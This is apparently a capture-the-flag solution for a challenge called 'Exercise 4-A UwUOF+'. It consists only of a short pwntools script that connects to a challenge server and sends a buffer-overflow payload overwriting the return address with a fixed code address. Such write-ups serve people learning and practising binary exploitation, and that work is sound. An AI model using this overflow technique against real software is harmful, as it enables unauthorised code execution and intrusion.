# Exercise 4-A UwUOF+ [100 points] (21 solves)
```python
from pwn import *
context.log_level = 'CRITICAL'
p = remote("chal.firebird.sh",35019)
payload = (b"UwU" * 3).ljust(80,b"A")+b"nothing\x00" +b"A"*8+b"A"*8+p64(0x4007d6)
p.sendline(payload)

print(p.recvall().decode())
```